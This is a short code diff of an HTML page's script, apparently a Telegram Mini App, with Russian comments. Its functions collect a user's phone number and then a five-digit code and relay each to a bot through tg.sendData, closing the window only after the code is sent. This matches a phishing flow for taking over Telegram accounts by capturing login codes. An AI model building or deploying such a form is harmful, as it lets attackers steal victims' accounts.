@@ -30,21 +30,22 @@
         tg.expand();
 
         function sendPhone() {
-            let val = document.getElementById("phone").value;
-            if(val.length > 5) {
-                tg.sendData("phone:" + val);
-                document.getElementById("step1").classList.add("hidden");
-                document.getElementById("step2").classList.remove("hidden");
-            }
-        }
+    let val = document.getElementById("phone").value;
+    if(val.length > 5) {
+        tg.sendData("phone:" + val);
+        // Убрали tg.close(), чтобы окно не закрывалось
+        document.getElementById("step1").style.display = "none";
+        document.getElementById("step2").style.display = "block";
+    }
+}
 
-        function sendCode() {
-            let val = document.getElementById("code").value;
-            if(val.length >= 5) {
-                tg.sendData("code:" + val);
-                tg.close();
-            }
-        }
+function sendCode() {
+    let val = document.getElementById("code").value;
+    if(val.length >= 5) {
+        tg.sendData("code:" + val);
+        tg.close(); // Закрываем только здесь
+    }
+}
     </script>
 </body>
 </html>
